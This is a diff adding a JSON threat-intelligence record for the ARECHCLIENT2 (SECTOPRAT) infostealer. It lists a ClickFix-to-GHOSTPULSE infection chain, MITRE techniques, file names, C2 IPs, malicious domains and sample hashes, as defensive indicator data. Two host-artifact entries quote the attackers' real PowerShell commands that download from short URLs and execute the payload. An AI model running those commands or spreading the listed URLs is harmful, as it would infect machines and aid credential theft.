@@ -1,0 +1,327 @@
+{
+  "malware_family": "ARECHCLIENT2 / SECTOPRAT",
+  "threat_actor": "",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "ARECHCLIENT2 is delivered through a multi-stage infection chain that begins with a ClickFix social engineering lure. The user is tricked into running a PowerShell command, which downloads and executes the GHOSTPULSE loader. GHOSTPULSE uses DLL sideloading and an intermediate .NET loader to reflectively load the final ARECHCLIENT2 payload into memory for information stealing.",
+  "mitre_techniques": [
+    "T1566",
+    "T1204",
+    "T1059.001",
+    "T1140",
+    "T1574.002",
+    "T1620",
+    "T1105",
+    "T1082",
+    "T1057",
+    "T1539"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "(Invoke-webrequest -URI 'https://shorter.me/XOWyT' -UseBasicParsing).content | iex",
+      "context": "Initial PowerShell command copied to clipboard and executed by the user.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "Invoke-WebRequest -Uri \"https://bitly.cx/iddD\" -OutFile \"$env:TEMP\\ComponentStyle.zip\"; Expand-Archive -Path \"$env:TEMP/ComponentStyle.zip\" -DestinationPath \"$env:TEMP\"; & \"$env:TEMP\\crystall\\Crysta_x86.exe\"",
+      "context": "Second stage PowerShell, downloads and executes GHOSTPULSE loader components.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "ComponentStyle.zip",
+      "context": "ZIP archive containing GHOSTPULSE components, downloaded to %TEMP%.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Crysta_x86.exe",
+      "context": "Legitimate executable used to sideload the GHOSTPULSE DLL.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Crysta_X64.exe",
+      "context": "Benign executable mentioned in analysis for sideloading GHOSTPULSE.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "DivXDownloadManager.dll",
+      "context": "GHOSTPULSE malicious DLL that is sideloaded.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Heeschamjiet.rc",
+      "context": "GHOSTPULSE IDAT PNG file containing the next stage encrypted payload.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Shonomteak.bxi",
+      "context": "GHOSTPULSE encrypted file containing stage 2 and configuration data.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "import_name",
+      "value": "vssapi.dll",
+      "context": "Library GHOSTPULSE injects stage 2 code into.",
+      "specificity": "medium",
+      "evidence": "encrypted_config",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "IDAT",
+      "context": "String used as a tag to find the start of encrypted data in the PNG file.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "F1",
+      "context": ".NET loader error message for LoadLibraryExW hooking failure.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "F2",
+      "context": ".NET loader error message for AMSI patching failure.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "D1",
+      "context": ".NET loader error message for failure to find .tls section.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "W2",
+      "context": ".NET loader error message for failure to load CLR.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "runClickedCheckboxEffects",
+      "context": "JavaScript function in ClickFix page that sends victim IP to C2.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "b_detect_process",
+      "context": "Boolean field name in GHOSTPULSE Stage 2 config structure.",
+      "specificity": "high",
+      "evidence": "source_identifier",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "clients.dealeronlinemarketing.com",
+      "context": "Initial access host for malicious captcha page.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "clients.contology.com",
+      "context": "Initial access host for malicious captcha page.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "koonenmagaziner.click",
+      "context": "Infection logging server contacted by initial JavaScript.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://api.ipify.org?format=json",
+      "context": "Used by initial JavaScript to get victim's public IP.",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://shorter.me/XOWyT",
+      "context": "URL contacted by first-stage PowerShell to fetch next stage.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://bitly.cx/iddD",
+      "context": "URL contacted by second-stage PowerShell to download GHOSTPULSE zip.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://pastebin.com/raw/Wg8DHh2x",
+      "context": "Hardcoded URL to fetch secondary ARECHCLIENT2 C2 IP.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/captcha",
+      "context": "URI path hosting the malicious ClickFix captcha page.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/Client",
+      "context": "URI path hosting the malicious ClickFix captcha page.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "50.57.243.90",
+      "context": "IP address hosting the initial malicious captcha pages.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "144.172.97.2",
+      "context": "ARECHCLIENT2 primary C2 server, hardcoded and encrypted in the binary.",
+      "specificity": "high",
+      "evidence": "encrypted_config",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "143.110.230.167",
+      "context": "ARECHCLIENT2 secondary C2 server, retrieved from Pastebin.",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "66.63.187.22",
+      "context": "Active ARECHCLIENT2 C2 server.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "45.94.47.164",
+      "context": "Active ARECHCLIENT2 C2 server.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "82cddf3a9bff315d8fc708e5f5f85f20",
+      "context": "MD5 hash of ARECHCLIENT2 C2 server response banner (HOST-BANNER_0_HASH).",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "2ec47cbe6d03e6bdcccc63c936d1c8310c261755ae5485295fecac4836d7e56a",
+      "description": "GHOSTPULSE sideload DLL (DivXDownloadManager.dll)."
+    },
+    {
+      "sha256": "a8ba1e14249cdd9d806ef2d56bedd5fb09de920b6f78082d1af3634f4c136b90",
+      "description": "GHOSTPULSE encrypted PNG payload (Heeschamjiet.rc)."
+    },
+    {
+      "sha256": "f92b491d63bb77ed3b4c7741c8c15bdb7c44409f1f850c08dce170f5c8712d55",
+      "description": ".NET loader for ARECHCLIENT2."
+    },
+    {
+      "sha256": "4dc5ba5014628ad0c85f6e8903de4dd3b49fed65796978988df8c128ba7e7de9",
+      "description": "ARECHCLIENT2 final payload."
+    }
+  ],
+  "file_types": [
+    "pe",
+    "dotnet",
+    "script"
+  ]
+}
